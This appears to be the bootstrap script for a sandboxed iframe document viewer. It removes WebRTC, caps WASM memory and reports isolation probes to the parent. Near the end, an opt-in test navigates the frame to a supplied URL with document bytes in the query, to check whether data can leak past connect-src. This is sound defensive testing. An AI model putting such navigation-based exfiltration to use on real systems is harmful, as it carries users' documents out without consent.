// Boots ibisOffice in a sandboxed iframe (opaque origin): no cookies, no
// storage, no reach into the parent. The parent posts the document's bytes;
// nothing is fetched here but the app itself.

// Remove WebRTC before ibisOffice is loaded (ADR-065 decision 2): no JS but
// ibisOffice's runs here, and this takes away the one way out CSP does not
// cover even from code that might. ibisOffice is imported only afterwards,
// dynamically, since a static import would be evaluated before this.
const WEBRTC = [
  'RTCPeerConnection',
  'webkitRTCPeerConnection',
  'RTCDataChannel',
  'RTCSessionDescription',
  'RTCIceCandidate',
  'RTCRtpSender',
  'RTCRtpReceiver',
  'RTCRtpTransceiver',
  'RTCDtlsTransport',
  'RTCIceTransport',
  'RTCSctpTransport',
  'RTCCertificate',
]
for (const name of WEBRTC) delete globalThis[name]
const { default: init, run, set_embed_options } = await import('/ibis/pkg/ibis_office_app.js')

// A ceiling on ibisOffice's WASM memory (wasm32 declares no maximum): whatever
// the document holds — images, fonts, layout — the heap cannot grow past it, and
// an allocation that would fails inside ibisOffice instead of taking the tab
// down. The bytes are patched as they are loaded; the file itself is unchanged.
// The probe page may set globalThis.__memMaxPages to try another ceiling.
const MEMORY_MAX_PAGES = globalThis.__memMaxPages ?? 16384 // 64 KiB pages: 1 GiB
const uleb = (bytes, at) => {
  let value = 0
  let shift = 0
  for (;;) {
    const b = bytes[at++]
    value += (b & 0x7f) * 2 ** shift
    shift += 7
    if (b < 0x80) return [value, at]
  }
}
const toUleb = (value) => {
  const out = []
  do {
    let b = value % 128
    value = Math.floor(value / 128)
    if (value) b |= 0x80
    out.push(b)
  } while (value)
  return out
}
function capMemory(bytes, maxPages) {
  let at = 8
  while (at < bytes.length) {
    const id = bytes[at]
    const [size, body] = uleb(bytes, at + 1)
    if (id === 5) {
      let [count, p] = uleb(bytes, body)
      const out = [...toUleb(count)]
      for (let i = 0; i < count; i++) {
        const flags = bytes[p++]
        if (flags & ~1) throw new Error(`unexpected memory flags ${flags}`)
        let min
        ;[min, p] = uleb(bytes, p)
        let max = maxPages
        if (flags & 1) {
          let declared
          ;[declared, p] = uleb(bytes, p)
          max = Math.min(declared, maxPages)
        }
        // A minimum above the ceiling would raise it; refuse the module instead.
        if (min > max) throw new Error(`memory minimum ${min} pages exceeds the ceiling ${max}`)
        out.push(1, ...toUleb(min), ...toUleb(max))
      }
      const section = [5, ...toUleb(out.length), ...out]
      const patched = new Uint8Array(at + section.length + (bytes.length - (body + size)))
      patched.set(bytes.subarray(0, at), 0)
      patched.set(section, at)
      patched.set(bytes.subarray(body + size), at + section.length)
      return patched
    }
    at = body + size
  }
  throw new Error('no memory section')
}
const wasmBytes = new Uint8Array(
  await (await fetch(new URL('/ibis/pkg/ibis_office_app_bg.wasm', location.href))).arrayBuffer()
)
// A module the ceiling cannot be put on is not run; the parent is told so.
let wasmModule
try {
  wasmModule = await WebAssembly.compile(capMemory(wasmBytes, MEMORY_MAX_PAGES))
} catch (err) {
  window.parent.postMessage({ type: 'error', message: String(err) }, '*')
  throw err
}

// What the frame can reach, reported to the parent.
const isolation = { origin: self.origin }
try {
  isolation.cookie = document.cookie
} catch (e) {
  isolation.cookie = `throws ${e.name}`
}
try {
  isolation.parentDom = String(Boolean(window.parent.document))
} catch (e) {
  isolation.parentDom = `throws ${e.name}`
}
try {
  isolation.localStorage = String(localStorage.length)
} catch (e) {
  isolation.localStorage = `throws ${e.name}`
}
// Code that is not part of the app cannot run: eval and Function need
// 'unsafe-eval', which the CSP leaves out (ibisOffice imports eval).
try {
  isolation.eval = String(eval('1 + 1'))
} catch (e) {
  isolation.eval = `throws ${e.name}`
}
try {
  isolation.newFunction = String(new Function('return 2')())
} catch (e) {
  isolation.newFunction = `throws ${e.name}`
}
isolation.rtc = typeof RTCPeerConnection // 'undefined' once removed
// Can code here get WebRTC back from a fresh realm? An iframe with no src
// needs no fetch, so frame-src does not stop it.
try {
  const child = document.createElement('iframe')
  document.body.append(child)
  isolation.rtcInChildFrame = typeof child.contentWindow?.RTCPeerConnection
  child.remove()
} catch (e) {
  isolation.rtcInChildFrame = `throws ${e.name}`
}
// A same-origin script outside the allowed paths must not load.
const otherScript = new Promise((resolve) => {
  const el = document.createElement('script')
  el.src = '/sandbox-forbidden.js'
  el.onload = () => resolve(window.__forbiddenRan ? 'RAN' : 'loaded')
  el.onerror = () => resolve('blocked')
  document.head.append(el)
})
const sameServer = fetch('/whoami', { credentials: 'include' })
  .then((r) => r.json())
  .then((j) => `reached, cookie ${j.cookie === null ? 'not sent' : 'SENT'}`)
  .catch((e) => `blocked (${e.message})`)
const elsewhere = fetch('https://example.com/')
  .then(() => 'reached')
  .catch(() => 'blocked')

const app = init({ module_or_path: wasmModule })

addEventListener('message', async (e) => {
  // Only a message the parent posted: a script here could dispatch a synthetic
  // one with its source set to the parent.
  if (window.parent === window) return // opened directly, not in an iframe
  if (!e.isTrusted || e.source !== window.parent || e.data?.type !== 'open') return
  try {
    await app
    set_embed_options(false, false, true, false, false)
    run(new URL('/ibis', location.href).href, e.data.name, new Uint8Array(e.data.bytes))
    window.__ibis?.mark('ready')
    isolation.sameServer = await sameServer
    isolation.elsewhere = await elsewhere
    isolation.otherScript = await otherScript
    window.parent.postMessage({ type: 'ready', isolation }, '*')
    // ?leak=<url> on the host: try to carry the document out by navigating this
    // frame, which connect-src does not cover.
    if (e.data.leak) {
      const head = Array.from(new Uint8Array(e.data.bytes).slice(0, 16), (b) =>
        b.toString(16)
      ).join('')
      setTimeout(() => {
        location.href = `${e.data.leak}?document=${head}`
      }, 500)
    }
  } catch (err) {
    window.parent.postMessage({ type: 'error', message: String(err) }, '*')
  }
})
window.parent.postMessage({ type: 'boot' }, '*')
